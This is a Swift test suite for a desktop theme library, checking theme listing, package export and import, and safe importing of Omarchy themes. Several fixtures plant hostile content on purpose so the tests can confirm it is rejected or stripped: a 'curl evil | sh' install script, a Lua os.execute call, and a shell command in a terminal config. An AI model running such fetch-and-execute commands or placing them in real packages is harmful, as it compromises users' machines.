import Foundation
@testable import SceneThemes
import SceneFoundation
import SceneTestSupport
import Testing

@Suite("Library")
struct LibraryTests {
    func library(_ home: FixtureHome) -> ThemeLibrary {
        ThemeLibrary(bundledFolder: Repo.themes, installedFolder: home.path("installed"))
    }

    @Test func listsBundledThemes() throws {
        let home = try FixtureHome()
        let (themes, problems) = library(home).loadAll()
        #expect(problems.isEmpty, "\(problems.map(\.errors))")
        #expect(Set(themes.map(\.id)).isSuperset(of: ["scene/tokyo-night", "scene/catppuccin", "scene/rose-pine", "scene/gruvbox"]))
    }

    @Test func exportThenImportRoundTrips() throws {
        let home = try FixtureHome()
        let lib = library(home)
        let theme = try Fixtures.themeWithWallpaper("catppuccin", in: home)
        let package = home.path("catppuccin.scenetheme")
        try lib.export(theme, to: package)
        let imported = try lib.importPackage(at: package)
        #expect(imported.id == "scene/catppuccin")
        #expect(!imported.isBundled)
        #expect(imported.variants[.dark]?.wallpapers.map(\.name) == ["dark-1.png", "dark-2.png"])
        // The installed copy replaces the bundled one in the list.
        #expect(lib.loadAll().themes.first { $0.id == "scene/catppuccin" }?.isBundled == false)
        try lib.remove(imported)
        #expect(lib.loadAll().themes.first { $0.id == "scene/catppuccin" }?.isBundled == true)
    }

    @Test func rejectsPackagesWithExtraFiles() throws {
        let home = try FixtureHome()
        let manifest = try Data(contentsOf: Repo.themes.appendingPathComponent("tokyo-night/theme.json"))
        let zip = try ZipArchive.create(files: [("theme.json", manifest), ("install.sh", Data("curl evil | sh".utf8))])
        try zip.write(to: home.path("evil.scenetheme"))
        #expect(throws: SceneError.self) { try library(home).importPackage(at: home.path("evil.scenetheme")) }
        #expect(!FileManager.default.fileExists(atPath: home.path("installed").path) || library(home).loadAll().themes.allSatisfy(\.isBundled))
    }

    @Test func importsOmarchyThemeColorsOnly() throws {
        let home = try FixtureHome()
        try home.write("omarchy/everforest/colors.toml", """
        mode = "dark"
        accent = "#a7c080"   # green accent
        background = "#2d353b"
        foreground = "#d3c6aa"
        red = "#e67e80"
        green = "#a7c080"
        yellow = "#dbbc7f"
        blue = "#7fbbb3"
        magenta = "#d699b6"
        cyan = "#83c092"
        bad key = "ignored"
        """)
        try home.write("omarchy/everforest/neovim.lua", "os.execute('touch /tmp/pwned')")
        try home.write("omarchy/everforest/ghostty.conf", "command = /bin/sh -c 'evil'")
        try FileManager.default.createDirectory(at: home.path("omarchy/everforest/backgrounds"), withIntermediateDirectories: true)
        try Fixtures.png(width: 1920, height: 1080).write(to: home.path("omarchy/everforest/backgrounds/2-lake.png"))
        try Fixtures.png(width: 1920, height: 1080).write(to: home.path("omarchy/everforest/backgrounds/1-forest.png"))
        try home.write("omarchy/everforest/backgrounds/notes.txt", "not an image")
        let theme = try library(home).importPackage(at: home.path("omarchy/everforest"))
        #expect(theme.id == "omarchy/everforest")
        let v = try #require(theme.variants[.dark])
        #expect(v.interface.background.hex == "#2d353b")
        #expect(v.terminal.ansi[1].hex == "#e67e80")
        #expect(v.wallpapers.map(\.name) == ["1-forest.png", "2-lake.png"])   // every background, in Omarchy's order
        let installed = try FileManager.default.contentsOfDirectory(atPath: theme.folder.path)
        #expect(Set(installed) == ["theme.json", "wallpapers"])
    }
}
